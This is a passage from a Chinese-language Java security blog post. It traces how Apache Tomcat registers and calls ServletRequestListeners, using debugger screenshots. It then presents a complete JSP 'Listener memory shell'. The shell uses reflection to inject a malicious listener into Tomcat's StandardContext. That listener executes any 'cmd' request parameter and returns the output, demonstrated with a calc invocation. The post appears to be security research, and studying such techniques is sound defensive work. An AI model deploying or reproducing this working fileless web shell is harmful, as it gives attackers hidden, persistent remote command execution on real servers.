<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sec.listen;<br><br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-meta">@WebServlet(&quot;/listener&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestListener</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        resp.getWriter().write(<span class="hljs-string">&quot;tomcat-listener!!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        doGet(req, resp);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>编写 Listener 程序</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sec.listen;<br><br><span class="hljs-keyword">import</span> javax.servlet.ServletRequestEvent;<br><span class="hljs-keyword">import</span> javax.servlet.ServletRequestListener;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebListener;<br><br><span class="hljs-meta">@WebListener</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ServletListener</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ServletRequestListener</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">requestDestroyed</span><span class="hljs-params">(ServletRequestEvent servletRequestEvent)</span> </span>&#123;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">requestInitialized</span><span class="hljs-params">(ServletRequestEvent servletRequestEvent)</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;ServletListener#requestInitialized is invoked!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="断点调试"><a href="#断点调试" class="headerlink" title="断点调试"></a>断点调试</h3><p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220410123033.png"></p>
<p>跟进到 <code>StandardContext#listenerStart</code> 方法，先获取监听器然后遍历监听器进行实例化</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220410123418.png"></p>
<p>进入findApplicationListeners方法，跟进看一下返回的是 <code>applicationListeners</code> 属性，其中包含我们编写的 <code>ServletListener</code></p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220410123909.png"></p>
<p>遍历并实例化完监听器之后把实例化对象加入到 <code>eventListeners</code> 中， 然后通过 <code>setApplicationEventListeners</code> 方法把 <code>eventListeners</code> 设置到 <code>applicationEventListenersList</code> 中</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220410124123.png"></p>
<p>跟进<code>setApplicationEventListeners</code> 方法，可以知道最终实例化出来的监听器被存储在 <code>applicationEventListenersList</code> 属性中</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220410124242.png"></p>
<p>注册监听器就完成了，下面来看看是怎么调用注册的监听器的，在 <code>requestInitialized</code> 方法上下断点，调试启动 Tomcat 中间件</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220410124419.png"></p>
<p>跟进到 <code>StandardContext#fireRequestInitEvent</code> 方法，通过 <code>getApplicationEventListeners</code> 方法获取到前面注册的监听器，然后循环遍历调用监听器的 <code>requestInitialized</code> 方法</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220410124920.png"></p>
</br>

<h3 id="构造Listener内存马"><a href="#构造Listener内存马" class="headerlink" title="构造Listener内存马"></a>构造Listener内存马</h3><p>通过上面的分析可以知道，最后遍历调用的是 StandardContext.applicationEventListenersList 属性，所以内存马构造中需要获取到 StandardContext 类，然后获取其 applicationEventListenersList 属性，最后注入我们构造的恶意监听器到 applicationEventListenersList 属性里，构造如下：</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.RequestFacade&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Arrays&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.List&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.ArrayList&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ServletListener</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ServletRequestListener</span> </span>&#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">requestDestroyed</span><span class="hljs-params">(ServletRequestEvent servletRequestEvent)</span> </span>&#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">requestInitialized</span><span class="hljs-params">(ServletRequestEvent servletRequestEvent)</span> </span>&#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                String cmd = servletRequestEvent.getServletRequest().getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>                <span class="hljs-comment">//获取到 Response 对象,用于命令回显输出</span><br>                org.apache.catalina.connector.RequestFacade requestFacade = (RequestFacade) servletRequestEvent.getServletRequest();<br>                Field requestField = Class.forName(<span class="hljs-string">&quot;org.apache.catalina.connector.RequestFacade&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>                requestField.setAccessible(<span class="hljs-keyword">true</span>);<br>                Request request = (Request) requestField.get(requestFacade);<br>                Response response = (Response) request.getResponse();<br>				<br>                <span class="hljs-comment">//命令执行并通过 Response 对象进行输出结果到浏览器中</span><br>                <span class="hljs-keyword">if</span> (cmd != <span class="hljs-keyword">null</span>)&#123;<br>                    InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();<br>                    <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br>                    <span class="hljs-keyword">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];<br>                    <span class="hljs-keyword">while</span> ((i = inputStream.read(bytes)) != -<span class="hljs-number">1</span>)&#123;<br>                        response.getWriter().write(<span class="hljs-keyword">new</span> String(bytes,<span class="hljs-number">0</span>,i));<br>                        response.getWriter().write(<span class="hljs-string">&quot;\r\n&quot;</span>);<br>                    &#125;<br>                &#125;<br>            &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                e.printStackTrace();<br>            &#125;<br><br>        &#125;<br>    &#125;<br>%&gt;<br><br><br>&lt;%<br>	<span class="hljs-comment">//获取到StandardContext 对象的 applicationEventListenersList 属性,最后把恶意构造的监听器注入到 applicationEventListenersList 属性中</span><br>    ServletContext servletContext = request.getServletContext();<br>    Field applicationContextField = servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    applicationContextField.setAccessible(<span class="hljs-keyword">true</span>);<br>    ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(servletContext);<br>    Field standardContextField = applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    standardContextField.setAccessible(<span class="hljs-keyword">true</span>);<br>    StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);<br>	<span class="hljs-comment">//创建一个Listeners的Object数组，用于添加</span><br>    Object[] applicationEventListeners = standardContext.getApplicationEventListeners();<br>	<span class="hljs-comment">//将数组转换为集合</span><br>    List&lt;Object&gt; objects = Arrays.asList(applicationEventListeners);<br>    ArrayList arrayList = <span class="hljs-keyword">new</span> ArrayList(objects);<br>	<span class="hljs-comment">//添加我们监听器</span><br>    arrayList.add(<span class="hljs-keyword">new</span> ServletListener());<br>	<span class="hljs-comment">//设置进我们的监听器</span><br>    standardContext.setApplicationEventListeners(arrayList.toArray());<br>    response.getWriter().write(<span class="hljs-string">&quot;Inject Success by listener!&quot;</span>);<br>%&gt;<br><br></code></pre></td></tr></table></figure>

<p>访问该页面，成功弹出计算器 </p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">8080</span>/listener.jsp?cmd=calc<br></code></pre></td></tr></table></figure>




    </div>
</div>
<style>
    #noneimg img {
        display: none;
        z-index: 109;
        width: 600px !important;
        border-radius: 0px;
        position: fixed;
        box-shadow: 0 0 0px #c3c3c300 !important;
        left: 0;
        top: 0;
        right: 0;
        bottom: 0;
        margin: auto !important;
    }

    @media screen and (max-width:600px) {
        #noneimg img {
            width: 88%
        }
    }
</style>
<script>
    $(function () { $('#article').click(function (e) { if (e.target.tagName == "IMG") { if ($('#nonediv').length == 0) { let MImg = `<div id='noneimg'><img src='${e.target.currentSrc}'></div>`; let MDiv = "<div id='nonediv' style='cursor: pointer;display: none; position: fixed;left: 0;top: 0; right: 0;bottom: 0;background-color: #333;opacity:0.5;z-index: 108;'></div>"; $('#article').append(MDiv); $('#article').append(MImg); $("#nonediv").fadeIn("slow"); $("#noneimg img").fadeIn("slow") } } else { if ($('#nonediv').length !== 0) { $("#noneimg ").fadeOut("slow"); $("#nonediv").fadeOut("slow"); setTimeout(function () { $('#nonediv').remove(); $('#noneimg').remove() }, 500) } } }); $('.article-content').addClass('content-move') });
</script>
<div class="Last-Next">
    
    <a href="/2022/04/10/Java%E5%AE%89%E5%85%A8-%E5%9F%BA%E4%BA%8ETomcat%E9%80%9A%E7%94%A8%E5%9B%9E%E6%98%BE%E9%93%BE/">
        <div class="last">
            <span>上一篇</span>
            <p>Java安全-Tomcat通用回显链</p>
        </div>
    </a>
    

    
    <a href="/2022/04/07/SSRF%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E6%BC%94%E7%BB%83/">
        <div class="next">
            <span>下一篇</span>
            <p>SSRF从外网到内网靶场演练</p>
        </div>
    </a>
    
</div>
		
<link rel="stylesheet" href="/css/food.css">

<div class="footer">
	<div class="Copyright">
		©2022 By TRRQ. 主题：<a
			style="text-decoration: none;display: contents; color: #898F9F;"
			target="_blank" rel="noopener" href="https://github.com/qiaobug/hexo-theme-quiet">Quiet</a>
	</div>
	<div class="contact">
		
		<a target="_blank" rel="noopener" href="https://github.com/qiaobug">
			<img src="https://cdn.jsdelivr.net/gh/duogongneng/MyBlogImg/imggithub.png" alt="Quiet主题">
		</a>
		
	</div>
</div>

<script src="/js/jquery.min.js"></script>


<script src="/js/gotop.js"></script>


<style type="text/css">
    @media screen and (min-width: 600px) {
        .goTop>span {
            display: block;
            border-radius: 50%;
            width: 66px;
            height: 66px;
            cursor: pointer;
            opacity: 0.8;
            background: rgba(18, 24, 58, 0.06);
            text-align: center;
            border: 1px solid rgba(18, 24, 58, 0.06);

            transition: border .5s;
            -moz-transition: border .5s;
            /* Firefox 4 */
            -webkit-transition: border .5s;
            /* Safari 和 Chrome */
            -o-transition: border .5s;
            /* Opera */
        }

        .goTop>span:hover {
            border: 1px solid #6680B3;
        }


        .goTop {
            position: fixed;
            right: 30px;
            bottom: 80px;
        }

        .goTop>span>svg {
            width: 30px;
            height: 30px;
            margin-top: 17.5px;
            opacity: 0.7;
        }

    }

    @media screen and (max-width: 600px) {
        .goTop {
            display: none;
        }
    }
</style>
<div class="goTop" id="js-go_top">
    <span>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
            <g>
                <path d="M13 12v8h-2v-8H4l8-8 8 8z"></path>
            </g>
        </svg>
    </span>
</div>
<script>
    $('#js-go_top').gotoTop({ offset: 500, speed: 300, animationShow: { 'transform': 'translate(0,0)', 'transition': 'transform .5s ease-in-out' }, animationHide: { 'transform': 'translate(100px,0)', 'transition': 'transform .5s ease-in-out' } });
</script>
<script>
	console.log('\n %c Hexo-Quiet 主题 %c https://github.com/QiaoBug/hexo-theme-quiet \n', 'color: #fadfa3; background: #030307; padding:5px 0;', 'background: #fadfa3; padding:5px 0;')
</script>
	</body>

</html>